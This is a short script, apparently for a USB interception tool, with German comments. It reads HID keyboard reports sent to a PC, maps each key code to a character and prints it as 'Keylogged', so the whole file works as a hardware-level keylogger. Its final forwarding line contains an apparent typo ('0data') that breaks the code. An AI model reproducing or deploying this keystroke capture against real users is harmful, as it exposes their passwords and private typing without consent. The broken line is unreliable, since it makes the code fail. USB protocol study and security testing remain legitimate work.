fn process(direction, data) {
    // Wir interessieren uns nur für Daten, die ZUM PC gehen (IN)
    // und die lang genug sind (Standard HID Keyboard Report ist 8 Bytes)
    if direction == "IN" && data.len() >= 8 {

        let key_code = data[2]; // Byte 2 ist der erste gedrückte Key

        // 0 = Keine Taste gedrückt (Key Release) -> ignorieren
        if key_code != 0 {
            let char = "";

            // Mapping HID Usage ID -> Zeichen (Auszug)
            if key_code >= 4 && key_code <= 29 {
                // a-z (4 ist a, 5 ist b, etc.)
                // Rhai hat keine direkte ASCII conversion, wir improvisieren
                let alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
                char = alphabet[key_code - 4];
            } else if key_code >= 30 && key_code <= 38 {
                // 1-9
                let nums = ["1","2","3","4","5","6","7","8","9"];
                char = nums[key_code - 30];
            } else if key_code == 39 { char = "0"; }
            else if key_code == 40 { char = "[ENTER]"; }
            else if key_code == 44 { char = "[SPACE]"; }
            else if key_code == 41 { char = "[ESC]"; }
            else if key_code == 42 { char = "[BACKSPACE]"; }
            else {
                char = `[HEX:${key_code}]`;
            }

            print(`Keylogged: ${char}`);
        }
    }
    send_to(direction, 0data);
}